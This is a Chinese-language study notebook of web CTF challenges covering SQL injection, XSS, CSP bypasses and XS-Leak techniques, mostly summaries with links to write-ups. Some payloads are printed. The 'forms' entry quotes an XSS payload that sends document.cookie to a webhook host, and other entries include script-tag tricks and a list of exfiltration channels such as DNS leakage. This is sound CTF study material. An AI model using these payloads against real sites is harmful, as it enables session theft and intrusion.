# Web笔记

越来越认识到什么是“好记性不如烂笔头”

此篇笔记对应的gist: https://gist.github.com/Lo4pca/248ed49dea0accfef1527788494e2fa5 。题目对应的关键词将加粗

标记`*`的条目原先是web3相关内容，现已移入Web3笔记->Legacy

## Resources

- [CVE-2025-4123](https://nightbloodz.github.io/grafana-CVE-2025-4123)
    - Grafana Full read SSRF and Account Takeover
    - https://grafana.com/blog/2025/07/17/grafana-security-release-medium-and-high-severity-fixes-for-cve-2025-6197-and-cve-2025-6023
    - https://www.sonicwall.com/blog/high-severity-open-redirect-vulnerability-in-grafana-leads-to-account-takeover-cve-2025-4123
- https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/html-injection
    - 利用`UTF-16 iframe/stylesheet content`的例子：**Secure Letter** 。如果题目出现html注入且允许iframe带有`src=data:`属性，就可以利用UTF-16编码吞掉换行符，窃取原有html在引号之前的所有内容
    - 这题还有一点，由于题目源码用`f.src='data:text/html'`往iframe里插入html，可以用double url encode绕过dompurify
- [bitset](https://github.com/infobahnctf/CTF-2025/tree/main/beginner/bitset)
    - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- 新的php [drupal](https://www.drupal.org/project/php)反序列化rce链： https://github.com/anzuukino/phpggc/tree/master/gadgetchains/Drupal/RCE/2
- https://aszx87410.github.io/beyond-xss
- 一些iframe与window的知识和利用： https://blog.huli.tw/2022/04/07/iframe-and-window-open

## SQL注入

资料链接：
- https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn%27t%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf
    - go语言的整数溢出导致的sql注入
    - 一道同样是整数溢出漏洞的题:[gomail](https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/gomail)

之前开过一个SQL分区，感觉之后的还是放在这里比较好。顺便记一些NoSQL数据库和一些类似SQL注入的漏洞
- [Penguin-Login](https://dothidden.xyz/la_ctf_2024/penguin-login)
    - 仅能使用`a-zA-Z0-9{_}`且不能使用LIKE和注释符的PostgreSQL盲注。LIKE的功能可以用BETWEEN代替
    - 其他wp（做法）： https://siunam321.github.io/ctf/LA-CTF-2024/web/penguin-login ，用`SIMILAR TO`和正则匹配代替LIKE。但是注意`{x}`在正则里表示匹配前一个字符x次，匹配带有`{}`的flag时可以去掉flag格式再匹配
- [Order Up 1](https://github.com/sambrow/my_ctf_challenges/tree/main/wolvsec_ctf_2024/order-up)
    - postgres sql布尔盲注。注入点发生在order字段处
    - 如何判断服务器使用的数据库
    - postgres里有个函数`current_query`，返回当前的查询语句
- [No Sql Injection](https://infosecwriteups.com/picoctf-2024-write-up-web-992348f48b99#4e8e)
    - MongoDB noSQL注入。要求在给定用户名但不知道其密码的情况下绕过登录
    - 也可以用`{"$gt":""}`
    - 另一篇详细的介绍wp： https://voxal.dev/blog/pico-2024-web#no-sql-injection
- [one-shot](https://gerlachsnezka.xhyrom.dev/writeups/amateursctf/2024/web/one-shot)
    - union all select的使用。union仅会返回不重复的查询内容，而union all会返回包括重复项的全部内容
- [Hacker Web Store](https://siunam321.github.io/ctf/NahamCon-CTF-2024/Web/Hacker-Web-Store)
    - 很少见这么完整的sqlite注入过程了。注入点出现在insert语句的values中，可以用[subquery](https://www.w3resource.com/sqlite/sqlite-subqueries.php)带出数据（即再包一层select语句）。当然经典union select在这里也能用： https://twc1rcle.com/ctf/team/ctf_writeups/nahamcon_2024/web/TheHackerWebstore
    - python flask(Werkzeug) password encryption破解。这类hash以`pbkdf2:sha256:600000`开头。有现成的破解工具:[Werkzeug-Cracker](https://github.com/AnataarXVI/Werkzeug-Cracker)
- [bbsqli](https://kashmir54.github.io/ctfs/L3akCTF2024)
    - 一个挺有意思的sql注入挑战。注入出现在username，要求注入sql语句将flag从email字段带出，且语句查询出的用户名等于username。有点唬人的成分在，只需要提前将构造好的sql语句作为用户名注册即可。wp作者使用了`INNER JOIN...on...`和LIKE语句。不过官方解法更简单，直接内嵌一个sql语句即可（subquery？）: **bbsqli**
- [User #1](https://j4ck4l-24.github.io/2024/06/12/BCACTF_5.0_Writeup/)
    - sqlite在update语句处的注入。包含：获取表名，字段名，表结构，修改字段等。修改时要注意`INTEGER PRIMARY KEY`，这类key必须是独特的，不能和其他的重复。但没有规定必须是递增的
    - `FOREIGN KEY(id) REFERENCES users(id) ON UPDATE CASCADE`表示修改users表的id也会修改当前表的id
    - 发现一个更简洁的做法： https://docs.google.com/document/d/1WaPoR1qaCXB-iLPM8jFbspiyjFN1rbAs7ij67T9HDQI/edit 。update时可以直接`id=id-1`
- [Intruder](https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Intruder)
    - c# ASP.NET Core（Razor Pages）网站。分析这类网站源码会比较复杂，需要利用Dockerfile找到dotnet命令启动的dll文件并反编译
    - c# LINQ注入（语法有点像sql query语句，甚至漏洞也发生于拼接）会导致RCE： https://www.nccgroup.com/us/research-blog/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571 。存在于LINQ1.0.7.10到1.2.25版本，poc见 https://github.com/Tris0n/CVE-2023-32571-POC
    - 然后是一个经典技巧：把要泄漏的文件移到网站根目录就能看到了：`/app/src/wwwroot`
- [prepared](https://yun.ng/c/ctf/2025-uoft-ctf/web/prepared)
    - python格式化字符串漏洞+mariadb sql注入。注入时用的是布尔注入，使网站仅在爆破出正确flag后登录成功。原理是用了`OR EXISTS`和`%`通配符（感觉这个东西起到个检查前缀的作用）。爆破flag字符时要注意`%`和`_`等在sql里有特殊意义的符号
        - 使用LIKE BINARY的做法： https://blog.regularofvanilla.com/posts/UotT
        - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
    - sql注入还可以往本地文件系统写文件（之前在php里见过类似的，只在某些权限开启时能用。不确定这里是不是）。看起来好像有两种语法，`OUTFILE`和`DUMPFILE`，有些时候一个能用一个不能用
    - 格式化字符串漏洞rce。有点像pyjail或模板注入时的做法。这题由于引入了[setuptools](https://github.com/pypa/setuptools)模块,多了个用`windows_support.ctypes.cdll`的做法。[官方wp](https://github.com/UofTCTF/uoftctf-2025-chals-public/blob/master/prepared-1)则要复杂一点，从ctypes库拿cdll。这些做法仅限题目有文件上传时使用，因为需要服务器加载恶意`.so`文件
    - sqlmap高级用法；使用tamper script：**prepared**
    - rce部分和这题有点像： https://ctf.gg/blog/buckeyectf-2024/gentleman 。这篇wp关于如何找利用的模块部分很详细
- [limited](https://lucashanson.fr/writeups/wolvctf_2025)
    - 比较普通的mysql union注入，补点基础
        - 无法在order by语句后注入union语句
        - `INFORMATION_SCHEMA.PROCESSLIST`表中记录数据库服务器内活动进程和线程的信息，比如当前执行的sql语句（可以获取完整的内容，包括语句内注释的部分）
    - 提取mysql服务器的密码hash： https://mh4ck3r0n3.github.io/posts/2025/03/23/limited-3 。如何用hashcat爆破hash： https://www.percona.com/blog/brute-force-mysql-password-from-a-hash
- [what-the-crypto](https://hackmd.io/@Arnav-Vora/r14esQ3Jxg)
    - sqlite glob通配符的用法
    - 这题还有个aes cbc的背景。利用翻转攻击修改cbc第n+1块的密文会毁掉第n块的明文，利用多行注释`/**/`跳过被毁坏的内容
- [legendary](https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/legendary),[wp](https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements)
    - PHP PDO prepared语句内的sql注入。有时会遇到这样的配置：`$pdo->prepare("SELECT $col FROM fruit WHERE name = ?");`,其中`$col`是“过滤”后的用户输入
    - 漏洞的第二个关键点在于`PDO::ATTR_EMULATE_PREPARES`属性。该属性为True表示PDO会先处理sql语句（转义字符，将占位符换成实际值等），再将处理后的语句发送至数据库。然而PDO使用的处理器是自己实现的，对null、`?`等字符的处理有问题
    - mysql（默认开启`PDO::ATTR_EMULATE_PREPARES`）和Postgres（需手动开启`PDO::ATTR_EMULATE_PREPARES`）中存在这个漏洞；但sqlite中不存在，因为sqlite本身不支持null字符
    - `$pdo->quote`默认用反斜杠转义字符串，即使是那些不支持反斜杠转义的引擎，如Postgres。此处同样可能导致sql注入
- [No Quotes 2](https://lance-kenji.gitbook.io/uoftctf-2026-writeups/web/uoftctf-2026-no-quotes-2)
    - 用sql REPLACE函数构造quine查询语句（执行语句的结果等于语句本身）
    - `No Quotes 3`为hash quine（执行语句的结果等于语句的sha2值）
    - 或者从`INFORMATION_SCHEMA.PROCESSLIST`调出当前执行的sql语句，不需要构造复杂的quine： **No Quotes 2**

## XSS

觉得是时候给xss建个分类了。最近见到的xss题目越来越多了(个人觉得XS leak和仅利用CSS的也算广义上的“xss”)
- [quickstyle](https://sheeptester.github.io/longer-tweets/lactf/#webquickstyle)
    - 利用form实现dom clobbering覆盖原本document里的函数（如`document.querySelectorAll`）。覆盖函数后程序内部无法调用该函数
    - CSP较为严格的情况下可以考虑利用CSS泄漏页面指定信息。这种技巧一般只需要一个字符一个字符地泄漏，即创建多个css泄露固定的一个信息；但这题要求一个css一次泄露完整的信息。如果覆盖所有可能性的话会导致payload过长，可以考虑3个字符3个字符地泄漏。构造payload时需要借助CSS变量，防止多种规则同时生效时被覆盖。一些CSP和CSS利用的分析和总结也可以参考wp：
        - `[attr="value"]`:Whether the attribute is exactly the string.
        - `[attr^="value"]`:Whether the attribute starts with a string.
        - `[attr$="value"]`:Whether the attribute ends with a string.
        - `[attr*="value"]`:Whether the attribute contains the string anywhere, at least once.
        - `[attr*="value" i]`:Adding i at the end makes the comparison case insensitive.
        - `[attr|="value"]`:This also can compare strings, but it has a special behavior that allows lang="en" and lang="en-US" to be treated similarly. It’s not particularly useful for anything but the lang attribute.
        - CSS可做大小写不敏感的匹配
    - 生日悖论（birthday paradox）的应用以及如何找De Bruijn graph里的Eulerian path。这种图可用来解决“给定几组相邻的子字符组，重建原本的字符串“的问题
    - 其他wp： https://raltheo.fr/p/quickstyle/ ，https://gist.github.com/arkark/5787676037003362131f30ca7c753627 ，使用了非预期解法。DOM Clobbering的部分相同，但是利用了bfache（浏览器的后退/前进缓存），使本该变化的密码不再变化，就能利用传统方式一个字符一个字符地泄漏了。关于chrome的cache机制： https://blog.arkark.dev/2022/11/18/seccon-en/#Step-1-Understanding-cache-behavior-in-Google-Chrome
    - 一个关于CSS Injection/exil strategies + DOM Clobbering的讲解视频： https://www.youtube.com/watch?v=DQ9yLCdmt-s
    - 官方wp： https://github.com/uclaacm/lactf-archive/tree/main/2024/web/quickstyle
- [ctf-wiki](https://blog.bawolff.net/2024/02/la-ctf-write-up-ctf-wiki.html)
    - 当CSP里有`SameSite=Lax`时，使用`<iframe>`加载不同域的网页时不会获取到cookie。cookie只会在top-level GET navigation中加载
    - 域名后添加一个`.`，如`lac.tf`和`lac.tf.`不会影响指向的网页（两者都会指向同一个网页），但浏览器会将两者视为不同网站，进而拥有不同的cookie，两者之间cookie不共通，无法互用。同时，位于`lac.tf.`的网页无法获取`lac.tf`上的内容，因为违反了same origin策略
    - 这题的设置比较特殊，要求利用xss时同时拥有cookie而且又没有cookie，在访问一个页面时，无cookie的情况下是查看内容，有cookie的情况下是编辑内容。一种解决办法是利用弹窗（Popup windows），用`<iframe>`加载网页，因上述的CSP原因，cross-site iframe无法获取的cookie，因此iframe内部是没有cookie的。这时若加载的网页里有xss漏洞，就能在内部执行脚本，调用`window.open()`开启一个弹窗。弹窗属于top-level GET navigation，所以能获取的cookie，于是弹窗内部又是拥有cookie的状态。不过现代浏览器通常都有弹窗拦截器，只能由用户交互弹出弹窗，脚本本身是不行的。除非题目用的admin bot关闭了弹窗拦截器。用这种做法的wp： https://rwandi-ctf.github.io/LACTF2024/ctf-wiki/ （另外还使用了`document.write`和form标签绕过`default-src 'self'`）
    - 浏览器的Cache partitioning机制：某个域下的`<iframe>`与该域的`top level navigation`网页的cache是分开的，包括那些可用于控制同域上其他网页的api和cookie。这个机制用于阻止第三方iframes和网站的通信。具体参考[文档](https://developers.google.com/privacy-sandbox/3pcd/storage-partitioning)。[blob](https://developer.mozilla.org/docs/Web/API/Blob) URL是这个机制的例外
    - blob URL简述就是对网页上某段内容的引用。blob url与创建自身的网页同源（same origin），不会应用Cache partitioning机制，而且可以在第三方情境下工作（work across third-party contexts），甚至可以做top-level navigation（与`data:` url区分）
    - 利用blob和iframe实现“同时拥有cookie而且又没有cookie”。创建一个iframe，里面包含构造的xss payload；xss payload内部将要泄漏的页面包装到blob url里。此时blob url内部是有cookie的，而iframe里则没有。注意创建iframe时，sandbox属性要为`allow-top-navigation allow-scripts allow-same-origin`
    - 其他wp： https://github.com/abhishekg999/CTFWriteups/tree/main/LACTF2024/ctf-wiki ，利用WebRTC配合DNS绕过CSP `connect-uri`，以及不用WebRTC的做法
- [Image gallery 1](https://blog.bi0s.in/2024/03/06/Web/ImageGallery1-bi0sCTF2024/)
    - 如果express服务器有这行代码：`app.use(express.static('public'));`，表明在用户访问路径`/`时默认使用当前app根目录下的`index.html`。攻击者可在服务器运行的时候修改或覆盖`index.html`，进而改变默认网页内容
    - CSP `httpOnly`还可以用chrome的[bfcache](https://web.dev/articles/bfcache)绕过。较真来看不能算一种专门针对`httpOnly`的绕过手段，而是有的时候cookie（或相关内容）会被映射到网页上，利用缓存后退一步网页直接获取到内容而已
    - 这题的完整步骤参考 https://gist.github.com/lebr0nli/843662f4d1f255cbe2e0f6252faf5589
- [Image gallery 2](https://blog.bi0s.in/2024/03/06/Web/ImageGallery1-bi0sCTF2024)
    - 可在svg图片里插入html实现xss/重定向
    - nginx byte range caching机制利用。若配置nginx服务器时有`proxy_set_header   Range $slice_range;`一行，表示启用了byte range caching。这个机制的实现有点问题，可以利用这个机制将一个文件切割。比如一个文件的内容是`abcdefgh`,先cache前面一部分，例如`abcd`，在cache第二部分，如`gh`，最后访问这个文件。nginx会拼接前面两段cache内容，导致response为`abcdgh`
    - Subresource Integrity（SRI）利用。导入script的时候可以加上`integrity`属性，若脚本内容不符合Integrity的sha256，则脚本不会被加载
    - dom cloberring和[cache probing](https://xsleaks.dev/docs/attacks/cache-probing)（仅限headless chrome）。cache probing简述就是，假如用户加载了某个网页，那么那个网页会被浏览器缓存，下次再访问时的速度就会比之前没访问过的网页快很多。利用这点可以泄漏出用户到底有没有访问过某个网页，或是有没有加载过某个资源
- [Variety Notes](https://blog.bi0s.in/2024/02/26/Web/VarietyNotes-bi0sCTF2024)
    - CSP的特例：如果某个允许的路径有服务器端的重定向至一个不被允许的路径，只要CSP允许当前domain，就不会违反CSP
    - js里的try-catch-finally中finally里的代码无论如何都会运行，即使函数已经在try或者catch中return
    - reDOS攻击
- [കുട്ടി Notes](https://blog.bi0s.in/2024/02/29/Web/KuttyNotes-bi0sCTF2024)
    - dom clobbering+XS-Leak
    - 若违反了CSP `script-src`,当前页面的script标签就会被禁用
    - 给CSS标签加上`blocking=render`属性会阻止页面资源的加载，直到当前资源已加载完毕
    - JS objection利用`.columns`查询时，若传入的参数为数组，表示使用aliases。aliases可以让objection.js使用不同的aliases返回同一段查询内容
    - 一般无法测量不同origin的页面加载时间。但是可以利用chrome的Connection-Pool机制。chrome的上限是256个socket。如果攻击者事先已阻塞255个socket，然后同时打开两个page A和B。B只会在A加载完成时才加载，借此可以测量出加载A所需的时间
    - 另一种做法是使用`loading="lazy"`属性。这个属性可以让一个图片在用户划到可能会看到图片的位置后才加载。xs-leak时控制oracle返回的内容量，使命中目标时图片会被挤到页面下方；没命中时则相反
- [The Genie pwn's adventures](https://github.com/GCC-ENSIBS/GCC-CTF-2024/tree/main/Web/TheGeniePwnAdventuresRevenge)
    - [Cookie jar overflow](https://medium.com/@ibm_ptc_security/cookie-jar-overflow-attack-ae5135b6100)+xss。这个有关cookie的漏洞不难理解，浏览器里能设置的cookie数量有限，达到限制后，旧的cookie会被新添加的挤掉。这种办法甚至可以移除掉HttpOnly的cookie（简单的js xss攻击移不掉）。所以如果可以控制admin bot设置很多cookie挤掉自己的session，然后再添加上自己的session并logout，就可成为admin
- [Elements](https://www.justinsteven.com/posts/2024/04/02/picoctf-2024-elements-csp-bypass)
    - 一个非常爆炸的xss挑战。虽然可通过一系列操作获取js eval，但题目修改了Chromium本身，加了一堆CSP的同时还禁用了WebRTC，并增加了Chrome Policy，network_prediction_options等选项。[hacktricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)里提到的绕过CSP的方法一个也不能用。最后还是用类似DOS的做法，flood server，使server在被flood的情况下响应延迟
    - 列举wp里提到的尝试绕过CSP带出flag的方法。虽然在本题不可用，但是记下来也是不错的参考表
        - `<img>`标签：被CSP default-src阻挡
        - `<script>`标签：被CSP script-src阻挡
        - `<link>`标签+stylesheet：被CSP style-src阻挡
        - fetch：被CSP connect-src阻挡
        - cross-site navigation（即直接修改`document.location.href`）：被Chrome Policy (URLAllowList/URLBlockList)阻挡
        - DNS Leakage（在DNS解析域名时在subdomain名处带出flag，或是使用诸如`<link rel="dns-prefetch" href="//example.com">`的payload。建议使用base32编码，因为DNS大小写敏感，base32编码基本全是大写字母）：被chromium preferences network_prediction_options阻挡
        - WebRTC：本题被patch掉无法考虑，不过根据其他题的经验，还蛮好用的
        - 此题使用的flood方法。属于side channel attack，受网速影响较大,而且耗时长。说实话这个方法基本没办法能拦着，只要能执行js代码就能DOS，然后就是考虑怎么测量了
    - 其他做法： https://hackmd.io/@touchgrass/HyZ2poy1C
    - 预期做法： https://voxal.dev/blog/pico-2024-web#elements 。一篇很值得读的wp，作者提供了解XSS题目的一些思路和探索过程（比如翻了一堆JS Web API）。最后的预期解法是利用Credential Management API。这个API顾名思义，在网站想要将密码存储到浏览器的密码管理器时使用。在调用`navigator.credientals.store`存储FederatedCredential类型的登录凭证时，会弹出一个窗口。这个窗口里有个icon，url可由我们设置。到这里就很明显了，FederatedCredential弹出的窗口的对icon url的请求不会被CSP阻挡，于是就能绕过CSP了。不过有个弊端，就是弹窗仅会在一个profile出现一次，要再想弹一次窗口需要换一个profile。如果某个题目显示指定给bot指定不同的profile，可能是使用这个技巧的标志
    - 最简单的做法： https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024/elements 。题目使用的chromium开启了实验功能，所以直接用实验功能之一的`PendingBeacon API`就能绕过CSP带出flag
- [Imposter](https://github.com/tamuctf/tamuctf-2024/tree/master/web/imposter)
    - XSS里io socket的使用
    - 其他payload：**imposter**
- [modern](https://gist.github.com/avlidienbrunn/ef849803da7607acb00cbaae0a03a4f2)
    - htmx题目，绕过CSP和DOMPurify
    - https://twitter.com/ryotkak/status/1738400596074615238
- [heterograph](https://r3kapig-not1on.notion.site/Midnight-Sun-CTF-2024-Quals-Jeopardy-cb986332bd3148a0b041b498141b6521)
    - 使用特殊字体绕过WAF
- [babylogin](https://github.com/cr3mov/cr3ctf-2024/tree/main/challenges/web/babylogin)
    - cookie-parser技巧：在cookie前加上`j:`前缀会使cookie-parser用`JSON.parse`处理cookie，有原型链污染的可能
    - xs-search：利用不同的HTTP Status code泄漏内容。参考 https://xsleaks.dev/docs/attacks/error-events
- [im_not_the_ceo](https://github.com/L3AK-TEAM/L3akCTF-2024-public/tree/main/web/im_not_the_ceo)
    - htmx+dompurify xss
    - 主要都是利用div标签，只是属性的不同：**im_not_the_ceo**
- [So Many Flags](https://github.com/luxeria/ctf-writeups/blob/main/GPN%20CTF%202024/So%20many%20flags.md)/[Even more flags](https://github.com/luxeria/ctf-writeups/blob/main/GPN%20CTF%202024/Even%20more%20flags.md)
    - chrome flags分析
    - 其他解法： https://github.com/lars-ctf/writeup-gpn22/blob/main/even-more-flags.md ，**even more flags** 利用命令注入。里面还有一些url的知识：可以在`/`后加上几乎任何东西
- [todo](https://github.com/luxeria/ctf-writeups/blob/main/GPN%20CTF%202024/todo.md)/[todo-hard](https://github.com/luxeria/ctf-writeups/blob/main/GPN%20CTF%202024/todo-hard.md)
    - CSP `default-src 'none'; script-src 'self' 'unsafe-inline'`时实现页面的重定向。给我想复杂了，我自己的payload是这样的：
    ```html
    <form method="get" id="theForm" action="./script.js"></form>
    <body onload="document.getElementById('theForm').submit();">
    ```
    - hard版本会将重定向的页面里的flag使用replace函数替换成别的。这个点我老是忘：既然我们可以执行js代码，自己手动把replace函数换成个别的就行了。其他做法：**todo-hard**
    - 结果这些利用xss重定向的方法全是非预期解。预期解是这个： https://cyber-man.pl/GPNCTF-2024-todo-web ，利用`Function.prototype.toString.apply`竟然可以打印出class里被注释的代码
- [secure-notes](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#secure-notes)
    - 类似题目wp： [hCorem](https://ctftime.org/writeup/16642)。一个由编码引发的故事。攻击者可以手动指定Byte Order Mark (BOM) 使xss payload在浏览器里由另一种编码显示，如`utf-16-be`，可过滤payload时处理payload代码的逻辑又将其看成另一种编码,如`utf-16-le`。此时在`utf-16-le`编码下看起来没问题的payload在浏览器里用`utf-16-be`解码就有问题了。总之，不要用utf-16编码，dompurify和chrome两者没法安全处理
- [flarenotes](https://zimzi.substack.com/p/vsctf-2024-flarenotes-revenge)
    - `/cdn-cgi/trace`利用。这个路径是cloudflare提供的，只要使用了这个服务的网站就有这个路径（因此题目源码看不到有关这个路径的内容）。比如 https://leetcode.com/cdn-cgi/trace 。这个路径会反射一些内容，其中包含user-agent。如果让网站用html处理其返回内容，就能在user-agent处插入html代码从而实现xss
    - firefox和chrome的差别：chrome忽略对于User-Agent字段值的覆盖，而firefox不会。见这段代码：
    ```js
    //这里如果get传参headers尝试覆盖浏览器自带的user-agent的话，firefox可以，chrome不行
    const res = await fetch(`${window.location.origin}/raw/${params.get("user")}`, {
                    headers: new Headers(JSON.parse(params.get("headers") || "{}"))
                });
    ```
    - 非预期解法：**flarenotes** 。也是xss，但没用`/cdn-cgi/trace`技巧。主要问题在于，代码里用dompurify过滤代码前忘记解码html entity了，但渲染时又解码了。这种不统一的地方通常就是漏洞点。见 https://stackoverflow.com/questions/22831988/string-attribute-values-in-multiple-lines-html
- [Noscript](https://octo-kumo.github.io/c/ctf/2024-wanictf/web/noscript)
    - 题目里有个很明显的xss，但由于csp是`default-src 'self'`和`script-src 'none'`，不能直接在这里xss偷cookie。里面还有个username字段，但这个字段是用plain格式返回的，不是html。虽然我想到了用meta标签重定向，可是不知道重定向到哪。看了这个wp才知道可以用`<object>`标签，在标签里指定`type="text/html"`就能把那个格式为plain的username当成html加载了
    - meta标签做法和一个比较奇怪的服务器行为：**noscript**。在用meta或object标签重定向/导入资源时，部分内容会被看作text/html，而部分只会被看成text/plain
- [sappy](https://zimzi.substack.com/p/googlectf-2024-sappy)
    - skill issue时刻。这题我看出来怎么搞xss了，但是不知道怎么绕过validate函数里的getDomain。比赛时和队友试了很久都没试出来怎么欺骗host名。至少现在看了wp又懂了一种url confusion的手段
    - 其他解法：**sappy** ，包含另一种的url欺骗方式。但似乎利用`data://` url才是官方预期解法（我怎么把这个忘了，我都想到`javascript://`了，结果`javascript://`不能用于fetch，但`data://`可以）
    - 其他wp： 
        - https://blog.chummydns.com/blogs/google-ctf-2024 。一些小技巧，比如可以在url后加`#`来将后续内容转换为hash tag忽略掉（见过好多次，老是忘）；iframe内的网站不会带cookie，可以用window.open解决；如何给打开的window/iframe post message
        - https://adragos.ro/google-ctf-2024
- [grand prix heaven](https://blog.chummydns.com/blogs/google-ctf-2024)
    - 这题倒没什么xss相关的技巧。就一点：看到奇怪的架构+innerHTML总是十分有九分的可疑
    - js的parseInt函数只要字符串开头是数字就可以正常parse。比如`0honk`会返回`0`
    - CRLF注入。如果`multipart/form-data`的boundary是固定的，就能跨boundary注入自定义内容
    - 调用JSON.parse时会对key做一次排序。所以parse时的顺序不等于parse后的顺序
    - 错误的正则匹配。`/[A-z]/`会匹配ascii值A到z的所有字符，比如`\`。不仅仅是26个字母的大小写。正确写法应该是`A-Za-z`。见 https://wtfjs.com/wtfs/2014-01-29-regular-expression-and-slash
    - js的`new URL(url, 'https://xxx/abc/')`可用来组建url。如果url是相对路径，结果是`https://xxx/abc/url`;但如果是绝对路径（以`\`或`/`开头。前者是因为URL会自动将其标准化为`/`），则结果为`https://xxx/url`。之前的路径会被覆盖
- [POSTVIEWER V3](../../CTF/GoogleCTF/2024/POSTVIEWER%20V3.md)
    - 也没什么xss技巧，是一个很复杂的架构+错误地直接拼接参数计算hash+race condition+如何在`storage.googleapis.com`下拿到xss
    - 另一种hash拼接的做法： https://adragos.ro/google-ctf-2024/
- [GAME ARCADE](https://blog.huli.tw/2024/06/28/google-ctf-2024-writeup)
    - POSTVIEWER V3的降级版（？）。修复了上一个版本的hash计算问题，但是出了个xss。这个xss的成因见 https://github.com/Sudistark/xss-writeups/blob/main/figma.com-xss.md ，说下面这段代码：
    ```js
    let p = document.createElement("div");
    p.innerHTML = "<img src=x onerror=alert()>";
    ```
    就算p没有被加入dom，也会触发xss。问就是魔法
    - [cookie tossing](https://security.stackexchange.com/questions/67608/cookie-tossing-explained)。假如在`a.b.com`设置了cookie `c=d`，在`b.com`上也用同名的cookie的话会受影响。这题需要自己构造一个subdomain `c.a.b.com`，在里面用js代码修改cookie，影响`a.b.com`里同名cookie的取值。xss出现在这个同名cookie处，所以成功在`a.b.com`得到xss
    - 又一个firefox和chrome的区别：chrome无法在`blob://` url下设置和读取cookie，但firefox可以
    - 一些[Public Suffix List](https://wiki.mozilla.org/Public_Suffix_List)的知识。上面提到的cookie tossing没法影响Public Suffix List里的domain（但是subdomain可以）。见 https://adragos.ro/google-ctf-2024/
- [IN-THE-SHADOWS](https://blog.huli.tw/2024/06/28/google-ctf-2024-writeup),[官方wp](https://github.com/google/google-ctf/tree/main/2024/quals/web-in-the-shadows)
    - css injection。目标是绕过过滤的情况下一次注入泄漏出[shadow dom](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM)之外的元素。“逃逸”shadow dom可以用`:host-context`或者`:host`。绕过过滤则是由于chromium的一个bug（现在修了），主要是在re-serialization某个style sheet（或者说取出某个css rule的cssText？）时，单引号被去掉了，导致css的含义改变，可以偷渡`@import`进去
    - 单注入点css injection泄漏内容。第一篇wp用了trigram的做法，个人感觉官方wp的做法更好,见 https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point
- [forms](https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/blob/main/Web/forms)
	- Content-Type header没有设置charset导致的xss。见这篇文章： https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/ 。浏览器一般按照这样的顺序决定当前文档使用的字符集：
	1. HTML文档开头的Byte-Order Mark（这玩意的xss见上面的secure-notes）
	2. Content-Type header里的charset属性
	3. HTML文档里的`<meta>`标签
	4. 都没有的话就由浏览器自动检测。有个字符集ISO-2022-JP非常特殊，首先它有四种escape sequences切换当前使用的字符集（文章里可以看到是什么，只要浏览器看见它们就会切换到对应的字符集）。其中一种`JIS X 0201 1976`和ascii基本相同，而重要的不同点在于`\`，在`JIS X 0201 1976`下会被看成日元的符号，反之亦然
	- 这道题作者的payload是`{'title': 'Totally not a sus title\x1b(J', 'questions': '[["Are you an impostor?\\"}];fetch(`webhook?${document.cookie}`).then(console.log);const foo=[//", true]]'}`，然后让admin打开`/form/fill/id`，内容为：
```html
        <title>Totally not a sus title(J</title>
        ...省略不重要的内容...下面这块是源码里base.html的内容
        <script>
        const messages = [
                    {category: 'error', message: "The following question is required: Are you an impostor?\"}];fetch(`webhook?${document.cookie}`).then(console.log);const foo=[//" },
        ];
```
最开始的title切换了当前的charset，因此其他的都正常渲染，除了那个`\`。这个符号本来是拿来转义后面的`"`的，没了后我们剩下的内容就逃逸出去了，成功执行xss payload。不过我这里用chrome打开没见到payload执行，可能因为bot用的是firefox

- [hello](https://yun.ng/c/ctf/2024-idek-ctf/web/hello)
	- 爆炸了，这题其实是个很简单的xss题，对xss payload唯一的限制是不能在payload里使用空格，`/`,`\r`,`\n`和`\t`（由此得出这些东西都可以用来代替标签里用来分割属性的空格）。然而这点用`\x0c`就能轻松绕过了（比赛期间我是在[这里](https://security.stackexchange.com/questions/47684/what-is-a-good-xss-vector-without-forward-slashes-and-spaces)找到的）。httponly的cookie可以用phpinfo页面绕过这点我也知道。那么卡在哪里了呢？卡在这个nginx.conf项：
	```
	location = /info.php {
	    allow 127.0.0.1;
	    deny all;
	}
	```
	但是bot和题目并不在一个机器上。结果发现这是个nginx mis-configuration，可以用`/info.php/.php`绕过……
    - 另一种绕过方式和更详细的wp： https://hxuu.github.io/blog/ctf/idek24/hello/ 。[hacktricks](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm)有记录
- [Tagless](https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless)
    - 对自己无语了，明明都找到关键点了还能死在最后一步……真的我这个脑子别打CTF了，干脆专职写这个repo得了（不打CTF的CTFer...）。总之这题的关键点是，题目提供了一个复述输入内容的页面，没有限制内容的格式，所以可以注入html。不能输入`<...>`，但是可以用url二次编码绕过。这点我看到了。但是csp设定了`script-src 'self'`，导致不能用inline script，只能从当前host导入js。不过网页还提供了一个功能：若当前url为404，就在网页上打出这个url。啊看到这个加上之前看过的[Noscript](https://octo-kumo.github.io/c/ctf/2024-wanictf/web/noscript)题，我就感觉可以利用一下。结果被那题带偏了，一直在想怎么用`<object>`标签导入，而且`<>`的过滤总是处理不好。用了url二次编码看起来行了，但是payload还是解析失败。看了wp才发现是js代码语法的问题，要这么搞：`<script src="/**/alert(document.domain)//"></script>`，加几个注释规避掉报错
- [htmlsandbox](https://blog.bawolff.net/2024/09/sekaictf-2024-htmlsandbox.html)
    - 如何绕过`document.querySelector('script, noscript, frame, iframe, object, embed') === null`检查：可以用`<template>`标签包住要隐藏的tag：`<template shadowrootmode="closed"><script>....</script></template>`
